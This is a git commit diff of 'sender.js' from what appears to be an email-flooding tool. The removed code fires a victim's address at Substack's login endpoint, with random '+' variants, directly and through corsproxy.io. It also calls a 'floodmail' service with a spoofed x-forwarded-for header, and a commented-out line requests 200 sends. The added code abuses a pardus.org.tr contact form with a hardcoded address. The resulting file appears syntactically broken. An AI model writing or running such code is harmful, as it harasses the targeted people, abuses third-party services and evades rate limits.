9bee931db9de218849e75657c8c5857560e60477
Rednexie <126991413+Rednexie@users.noreply.github.com>
2024-03-09 18:52:08 +0300

    Update sender.js

--- modules/sender.js
+++ modules/sender.js
@@ -2,89 +2,24 @@ const fetch = require("node-fetch");
 const cache = require("./cache.js");
 function direct(email) {
 
-fetch("https://substack.com/api/v1/email-login", {
+module.exports = (mail) => {
+fetch("https://www.pardus.org.tr/wp-json/contact-form-7/v1/contact-forms/1701/feedback", {
   "headers": {
-    "accept": "*/*",
+    "accept": "application/json, */*;q=0.1",
     "accept-language": "tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7",
-    "cache-control": "no-cache",
-    "content-type": "application/json",
-    "pragma": "no-cache",
-    "sec-ch-ua": "\"Chromium\";v=\"116\", \"Not)A;Brand\";v=\"24\", \"Google Chrome\";v=\"116\"",
+    "content-type": "multipart/form-data; boundary=----WebKitFormBoundary0kwF942rg8jkMHlt",
+    "sec-ch-ua": "\"Chromium\";v=\"122\", \"Not(A:Brand\";v=\"24\", \"Google Chrome\";v=\"122\"",
     "sec-ch-ua-mobile": "?0",
     "sec-ch-ua-platform": "\"Windows\"",
     "sec-fetch-dest": "empty",
     "sec-fetch-mode": "cors",
     "sec-fetch-site": "same-origin"
   },
-  "referrer": "https://substack.com/sign-in?redirect=%2F%3Fref%3Dbuffer.com&for_pub=milkkarten",
+  "referrer": "https://www.pardus.org.tr/",
   "referrerPolicy": "strict-origin-when-cross-origin",
-  "body": "{\"redirect\":\"/?ref=buffer.com\",\"for_pub\":\"milkkarten\",\"email\":\"" + email.trim().split("@")[0] + "+" + Math.round(Math.random() * 10) + "@" +email.trim().split("@")[1] + "\",\"captcha_response\":null}",
+  "body": "------WebKitFormBoundary0kwF942rg8jkMHlt\r\nContent-Disposition: form-data; name=\"_wpcf7\"\r\n\r\n1701\r\n------WebKitFormBoundary0kwF942rg8jkMHlt\r\nContent-Disposition: form-data; name=\"_wpcf7_version\"\r\n\r\n5.8.7\r\n------WebKitFormBoundary0kwF942rg8jkMHlt\r\nContent-Disposition: form-data; name=\"_wpcf7_locale\"\r\n\r\nen_US\r\n------WebKitFormBoundary0kwF942rg8jkMHlt\r\nContent-Disposition: form-data; name=\"_wpcf7_unit_tag\"\r\n\r\nwpcf7-f1701-p8387-o1\r\n------WebKitFormBoundary0kwF942rg8jkMHlt\r\nContent-Disposition: form-data; name=\"_wpcf7_container_post\"\r\n\r\n8387\r\n------WebKitFormBoundary0kwF942rg8jkMHlt\r\nContent-Disposition: form-data; name=\"_wpcf7_posted_data_hash\"\r\n\r\n2346f7dda6da4e8a51b621bc3679a887\r\n------WebKitFormBoundary0kwF942rg8jkMHlt\r\nContent-Disposition: form-data; name=\"e-mail\"\r\n\r\nswbgvn@hldrive.com\r\n------WebKitFormBoundary0kwF942rg8jkMHlt--\r\n",
   "method": "POST",
   "mode": "cors",
   "credentials": "include"
 })
-    .then((response) => response.text())
-    .then((data) => {})
-    .catch((error) => console.error(error));
-
-
-
-fetch("https://floodmail.net/free/" + email.trim(), {
-    headers: {
-      "User-Agent": "floodmailprivateservices",
-      "x-forwarded-for": "149.102.229." + Math.random().toString().substring("17","18") + Math.random().toString().substring("16","17"),
-      "accept": "application/json, text/plain, */*",
-      "accept-language": "tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7",
-      "cache-control": "no-cache",
-      pragma: "no-cache",
-      "sec-ch-ua": '"Not/A)Brand";v="99", "Google Chrome";v="115", "Chromium";v="115"',
-      "sec-ch-ua-mobile": "?0",
-      "sec-ch-ua-platform": '"Windows"',
-      "sec-fetch-dest": "empty",
-      "sec-fetch-mode": "cors",
-      "sec-fetch-site": "same-origin",
-    },
-    referrer: "https://floodmail.net",
-    referrerPolicy: "strict-origin-when-cross-origin",
-    body: "",
-    method: "POST",
-    mode: "cors",
-    credentials: "omit",
-  })
-}
-
-function corsproxy_io(email) {
-
-fetch("https://corsproxy.io/?https://substack.com/api/v1/email-login", {
-  "headers": {
-    "accept": "*/*",
-    "accept-language": "tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7",
-    "cache-control": "no-cache",
-    "content-type": "application/json",
-    "pragma": "no-cache",
-    "sec-ch-ua": "\"Chromium\";v=\"116\", \"Not)A;Brand\";v=\"24\", \"Google Chrome\";v=\"116\"",
-    "sec-ch-ua-mobile": "?0",
-    "sec-ch-ua-platform": "\"Windows\"",
-    "sec-fetch-dest": "empty",
-    "sec-fetch-mode": "cors",
-    "sec-fetch-site": "same-origin"
-  },
-  "referrer": "https://substack.com/sign-in?redirect=%2F%3Fref%3Dbuffer.com&for_pub=milkkarten",
-  "referrerPolicy": "strict-origin-when-cross-origin",
-  "body": "{\"redirect\":\"/?ref=buffer.com\",\"for_pub\":\"milkkarten\",\"email\":\"" + email + "\",\"captcha_response\":null}",
-  "method": "POST",
-  "mode": "cors",
-  "credentials": "include"
-})
-    .then((response) => response.text())
-    .then((data) => {})
-    .catch((error) => console.error(error));
-}
-
-
-
-module.exports = (email) => {
-  direct(email);
-  corsproxy_io(email);
-  // fetch("https://sturdy-space-system-g4xp7g65447c96gw-3000.app.github.dev/?mail=" + email + "&times=200");
-};
+});
